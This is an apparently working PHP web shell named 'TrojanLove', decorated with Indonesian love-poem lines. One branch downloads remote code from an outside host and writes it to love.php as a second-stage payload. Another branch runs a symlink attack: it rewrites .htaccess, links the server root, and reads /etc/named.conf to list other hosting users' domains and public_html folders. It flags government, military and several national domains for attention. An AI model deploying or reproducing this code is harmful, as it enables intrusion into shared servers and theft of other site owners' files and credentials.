<?php
/* Mencoba selalu menyayangimu */
/* Walau engkau tak pernah menyadarinya */
echo "<!Mencoba menyayangimu>
<title>/* Priv8 */</title>
<center>
<br>
<br>
<h1>TrojanLove</h1>
<font color='red'>Aku tau kamu lebih memilihnya..<br>Ya.. aku memang bukan siapa siapa..<br>Aku bukan apa apanya dengan pacar barumu..<br>Dia kaya..<br>Dia sempurna..<br>Sedangkan aku.. aku bukan siapa siapa..<br>Aku bukan apa apa..<br><br>Trojan with Love</font>
</center>";
if($_GET['aku'] == 'kamu') {
$cinta1 = $_GET['dir'];
$cinta2 = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$love1 = file_get_contents('http://teachpc.ir/new.txt');
$love2 = 'love.php';
$love3 = fopen($love2, 'a');
fwrite($love3, "$love1");
fclose($love3);
echo "<br><br><center><font color='green'><a href='$cinta2/love.php' style='text-decoration: none;' target='_blank'>Aku menyayangimu :)</a></font></center>";
}
elseif($_GET['do'] == 'sym') {	 @set_time_limit(0);
echo "<br><br><center><h1>Symlink by JembotShell</h1></center><br><br><center><div class=content>";
@mkdir('sym',0777); $htaccess = "Options all n DirectoryIndex Sux.html n AddType text/plain .php n AddHandler server-parsed .php n AddType text/plain .html n AddHandler txt .html n Require None n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess); @symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf) 
{ 
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
}
else { echo "<br><br><div class='tmp'><table border='1' bordercolor='white' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>Symlink </td>";
foreach($read_named_conf as $subject){ if(eregi('zone',$subject)){ preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){ $UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name = $string[1][0];
$iran = '.ir';
$israel = '.il';
$indo = '.id';
$sg12 = '.sg';
$edu = '.edu';
$gov = '.gov';
$gose = '.go';
$gober = '.gob'; 
$mil1 = '.mil';
$mil2 = '.mi';
$malay	= '.my';
$china	= '.cn';
$japan	= '.jp';
$austr	= '.au';
$porn	= '.xxx';
$as		= '.uk';
$calfn	= '.ca';
if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0]) or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0]) or eregi ("$malay",$string[1][0]) or eregi("$china",$string[1][0]) or eregi("$japan",$string[1][0]) or eregi ("$austr",$string[1][0]) or eregi("$porn",$string[1][0]) or eregi("$as",$string[1][0]) or eregi ("$calfn",$string[1][0])) { $name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>'; 
} 
echo " <tr> <td> <div class='dom'>
<a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div> 
</td>
<td> 
'.$UID['name']." </td>
<td> 
<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a> </td>
</tr></div> "; 
flush(); 
} 
} 
} 
} 
echo "</center></table>"; 
}
?>